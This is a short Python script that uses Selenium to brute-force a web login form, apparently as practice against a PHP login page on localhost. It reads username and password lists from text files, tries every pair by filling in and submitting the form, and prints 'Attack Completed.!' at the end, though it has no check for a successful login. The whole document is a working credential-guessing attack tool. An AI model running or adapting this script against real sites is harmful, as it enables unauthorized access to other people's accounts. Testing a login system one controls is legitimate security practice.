# importing libraries
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from getpass import getpass

# getting users and passwords from file
usernameList = open("username.txt", "r")
passwordList = open("password.txt", "r")

# adding data file to list
with open('username.txt', 'r') as f:
    myNames = f.readlines()
with open("password.txt", "r") as p:
    myPass = p.readlines()

# getting reference of webDriver to access fields of web
driver = webdriver.Chrome("C:\\dev\\chromedriver\\chromedriver.exe")

def brutForceLogin(username, password):

    # getting the url of the webpage which we want to access using this script
    # in our case our site a hosted on localhost
    driver.get("http://localhost:8080/phploginsystem/login.php")

    # # accessing the field of this website to login
    username_textBox = driver.find_element_by_name("username")
    # # sending username to username field
    username_textBox.send_keys(username)

    password_textBox = driver.find_element_by_name("password")
    password_textBox.send_keys(password)

    login_button = driver.find_element_by_id("login")
    login_button.submit()


try:
    for username in myNames:
        for password in myPass:
            brutForceLogin(username, password)
except:
    print("Attack Completed.!")
